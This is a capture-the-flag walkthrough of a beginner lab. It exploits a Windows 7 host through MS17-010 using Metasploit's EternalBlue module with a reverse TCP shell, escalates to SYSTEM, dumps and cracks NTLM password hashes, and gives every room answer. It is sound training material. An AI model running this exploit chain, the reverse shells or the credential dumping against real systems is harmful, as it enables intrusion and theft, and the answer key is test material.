# Task 1 Recon
----
>>Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused. 

```bash [nmap]
root@ip-10-10-179-6:~# nmap -sC -sV -Pn 10.10.72.117

Starting Nmap 7.60 ( https://nmap.org ) at 2021-11-27 06:28 GMT
Nmap scan report for ip-10-10-72-117.eu-west-1.compute.internal (10.10.72.117)
Host is up (0.00047s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2021-11-26T06:28:38
|_Not valid after:  2022-05-28T06:28:38
|_ssl-date: 2021-11-27T06:30:43+00:00; +1s from scanner time.
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49159/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:23:69:10:8B:2B (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:23:69:10:8b:2b (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-11-27T00:30:43-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-11-27 06:30:43
|_  start_date: 2021-11-27 06:28:36

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.70 seconds

```

1.Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)
>>No answer needed

2.How many ports are open with a port number under 1000?
>>3

3.What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
>>ms17-010

----

# Task 2 Gain Access
----

>>Exploit the machine and gain a foothold.

```bash [metasploit]
root@ip-10-10-179-6:~# msfconsole
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: After running db_nmap, be sure to check out the result of hosts and services

msf5 > search CVE-2017-0144

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   1  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   2  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 2 or use exploit/windows/smb/smb_doublepulsar_rce

msf5 > use 1
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.179.6      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs

msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.72.117
RHOSTS => 10.10.72.117

msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp 
payload => windows/x64/shell/reverse_tcp

msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.179.6:4444 
[*] 10.10.72.117:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.72.117:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.72.117:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.72.117:445 - Connecting to target for exploitation.
[+] 10.10.72.117:445 - Connection established for exploitation.
[+] 10.10.72.117:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.72.117:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.72.117:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.72.117:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.72.117:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.72.117:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.72.117:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.72.117:445 - Sending all but last fragment of exploit packet
[*] 10.10.72.117:445 - Starting non-paged pool grooming
[+] 10.10.72.117:445 - Sending SMBv2 buffers
[+] 10.10.72.117:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.72.117:445 - Sending final SMBv2 buffers.
[*] 10.10.72.117:445 - Sending last fragment of exploit packet!
[*] 10.10.72.117:445 - Receiving response from exploit packet
[+] 10.10.72.117:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.72.117:445 - Sending egg to corrupted connection.
[*] 10.10.72.117:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.72.117
[*] Command shell session 1 opened (10.10.179.6:4444 -> 10.10.72.117:49191) at 2021-11-27 06:45:05 +0000
[+] 10.10.72.117:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.72.117:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.72.117:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

C:\Windows\system32>
```
1.Start Metasploit
>>No answer needed

2.Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
>>exploit/windows/smb/ms17_010_eternalblue

3.Show options and set the one required value. What is the name of this value? (All caps for submission)
>>Rhosts

Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

set payload windows/x64/shell/reverse_tcp

4.With that done, run the exploit!
>>No answer needed

5.Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 
>>No answer needed

----

# Task 3 Escalate
----

>>Escalate privileges, learn how to upgrade shells in metasploit.
Answer the questions below

```bash
C:\Windows\system32>^Z
Background session 1? [y/N] y

msf5 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade

msf5 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter 
msf5 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  1         shell x64/windows  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.10.179.6:4444 -> 10.10.72.117:49191 (10.10.72.117)
 
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.179.6:4433 
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (176195 bytes) to 10.10.72.117
[*] Meterpreter session 2 opened (10.10.179.6:4433 -> 10.10.72.117:49205) at 2021-11-27 06:56:43 +0000
[*] Stopping exploit/multi/handler
msf5 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.10.179.6:4444 -> 10.10.72.117:49191 (10.10.72.117)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                      10.10.179.6:4433 -> 10.10.72.117:49205 (10.10.72.117)

msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > 
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 428   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 564   556   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 612   556   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 624   604   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 664   604   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 712   612   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 720   612   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 728   612   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 780   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 836   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 904   712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 952   712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1020  664   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 1080  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1180  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1288  712   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1324  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1412  712   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1432  712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1468  1992  powershell.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
 1484  712   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1576  712   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 1624  712   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1956  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1992  1748  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 2080  836   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
 2096  836   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 2396  712   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 2476  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2560  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2736  1288  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2864  712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2900  712   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2952  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2984  712   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe

meterpreter > migrate 2984
[*] Migrating from 1468 to 2984...
[*] Migration completed successfully. 
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

```
1.If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
>>post/multi/manage/shell_to_meterpreter

2.Select this (use MODULE_PATH). Show options, what option are we required to change?
>>session

3.Set the required option, you may need to list all of the sessions to find your target here. 
>>No answer needed

4.Run! If this doesn't work, try completing the exploit from the previous task once more.
>>No answer needed

5.Once the meterpreter shell conversion completes, select that session for use.
>>No answer needed

6.Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 
>>No answer needed

7.List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
>>No answer needed

8.Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 
>>No answer needed

----

# Task 4 Cracking
----

>>Dump the non-default user's password and crack it!

```
Encoded in NTLM : ffb43f0de35be4d9917ac0cc8ad57f8d
DECOED : alqfna22
```
1.Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
>>Jon

2.Copy this password hash to a file and research how to crack it. What is the cracked password?
>>alqfna22

----

# Task 5 Find flags!
----

>>Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below to complete this room!

```bash
meterpreter > cd /
meterpreter > ls
Listing: C:\
============

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40777/rwxrwxrwx   0        dir   2009-07-14 04:18:56 +0100  $Recycle.Bin
40777/rwxrwxrwx   0        dir   2009-07-14 06:08:56 +0100  Documents and Settings
40777/rwxrwxrwx   0        dir   2009-07-14 04:20:08 +0100  PerfLogs
40555/r-xr-xr-x   4096     dir   2009-07-14 04:20:08 +0100  Program Files
40555/r-xr-xr-x   4096     dir   2009-07-14 04:20:08 +0100  Program Files (x86)
40777/rwxrwxrwx   4096     dir   2009-07-14 04:20:08 +0100  ProgramData
40777/rwxrwxrwx   0        dir   2018-12-13 03:13:22 +0000  Recovery
40777/rwxrwxrwx   4096     dir   2018-12-12 23:01:17 +0000  System Volume Information
40555/r-xr-xr-x   4096     dir   2009-07-14 04:20:08 +0100  Users
40777/rwxrwxrwx   16384    dir   2009-07-14 04:20:08 +0100  Windows
100666/rw-rw-rw-  24       fil   2018-12-13 03:47:39 +0000  flag1.txt
0000/---------    4355808  fif   1970-02-24 19:33:04 +0100  hiberfil.sys
0000/---------    4355808  fif   1970-02-24 19:33:04 +0100  pagefile.sys

meterpreter > cat flag1.txt 
flag{access_the_machine}

meterpreter > cd /Windows
meterpreter > cd System32
meterpreter > cd config
meterpreter > ls
Listing: C:\Windows\System32\config
===================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  28672     fil   2009-07-14 06:32:39 +0100  BCD-Template
100666/rw-rw-rw-  25600     fil   2009-07-14 06:38:35 +0100  BCD-Template.LOG
100666/rw-rw-rw-  18087936  fil   2009-07-14 03:34:08 +0100  COMPONENTS
100666/rw-rw-rw-  1024      fil   2009-07-14 08:07:31 +0100  COMPONENTS.LOG
100666/rw-rw-rw-  13312     fil   2009-07-14 03:34:08 +0100  COMPONENTS.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 03:34:08 +0100  COMPONENTS.LOG2
100666/rw-rw-rw-  1048576   fil   2021-11-27 06:29:11 +0000  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.0.regtrans-ms
100666/rw-rw-rw-  1048576   fil   2021-11-27 06:29:11 +0000  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.1.regtrans-ms
100666/rw-rw-rw-  1048576   fil   2021-11-27 06:29:11 +0000  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.2.regtrans-ms
100666/rw-rw-rw-  65536     fil   2021-11-27 06:29:11 +0000  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.blf
100666/rw-rw-rw-  65536     fil   2009-07-14 05:54:56 +0100  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2009-07-14 05:54:56 +0100  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2009-07-14 05:54:56 +0100  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2009-07-14 03:34:08 +0100  DEFAULT
100666/rw-rw-rw-  1024      fil   2009-07-14 08:07:31 +0100  DEFAULT.LOG
100666/rw-rw-rw-  177152    fil   2009-07-14 03:34:08 +0100  DEFAULT.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 03:34:08 +0100  DEFAULT.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:22:09 +0000  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:09 +0000  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:09 +0000  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
40777/rwxrwxrwx   0         dir   2009-07-14 04:20:10 +0100  Journal
40777/rwxrwxrwx   4096      dir   2009-07-14 04:20:10 +0100  RegBack
100666/rw-rw-rw-  262144    fil   2009-07-14 03:34:08 +0100  SAM
100666/rw-rw-rw-  1024      fil   2009-07-14 08:07:31 +0100  SAM.LOG
100666/rw-rw-rw-  21504     fil   2009-07-14 03:34:08 +0100  SAM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 03:34:08 +0100  SAM.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:22:09 +0000  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:09 +0000  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:09 +0000  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2009-07-14 03:34:08 +0100  SECURITY
100666/rw-rw-rw-  1024      fil   2009-07-14 08:07:30 +0100  SECURITY.LOG
100666/rw-rw-rw-  21504     fil   2009-07-14 03:34:08 +0100  SECURITY.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 03:34:08 +0100  SECURITY.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:22:08 +0000  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:09 +0000  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:09 +0000  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  40632320  fil   2009-07-14 03:34:08 +0100  SOFTWARE
100666/rw-rw-rw-  1024      fil   2009-07-14 08:07:30 +0100  SOFTWARE.LOG
100666/rw-rw-rw-  262144    fil   2009-07-14 03:34:08 +0100  SOFTWARE.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 03:34:08 +0100  SOFTWARE.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:21:18 +0000  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:21:18 +0000  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:21:18 +0000  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  12582912  fil   2009-07-14 03:34:08 +0100  SYSTEM
100666/rw-rw-rw-  1024      fil   2009-07-14 08:07:30 +0100  SYSTEM.LOG
100666/rw-rw-rw-  262144    fil   2009-07-14 03:34:08 +0100  SYSTEM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 03:34:08 +0100  SYSTEM.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:21:15 +0000  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:21:15 +0000  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:21:15 +0000  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
40777/rwxrwxrwx   4096      dir   2009-07-14 04:20:10 +0100  TxR
100666/rw-rw-rw-  34        fil   2018-12-13 03:48:22 +0000  flag2.txt
40777/rwxrwxrwx   4096      dir   2009-07-14 04:20:10 +0100  systemprofile

meterpreter > cat flag2.txt
flag{sam_database_elevated_access}
meterpreter > cd C:\\Users\\Jon\\Documents\\
meterpreter > ls
Listing: C:\Users\Jon\Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2018-12-13 03:13:31 +0000  My Music
40777/rwxrwxrwx   0     dir   2018-12-13 03:13:31 +0000  My Pictures
40777/rwxrwxrwx   0     dir   2018-12-13 03:13:31 +0000  My Videos
100666/rw-rw-rw-  402   fil   2018-12-13 03:13:45 +0000  desktop.ini
100666/rw-rw-rw-  37    fil   2018-12-13 03:49:18 +0000  flag3.txt

meterpreter > cat flag3.txt 
flag{admin_documents_can_be_valuable}
```

1.Flag1? This flag can be found at the system root. 
>>flag{access_the_machine}

2.Flag2? This flag can be found at the location where passwords are stored within Windows.
[ * ] Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 
>>flag{sam_database_elevated_access}

3.flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
>>flag{admin_documents_can_be_valuable}

----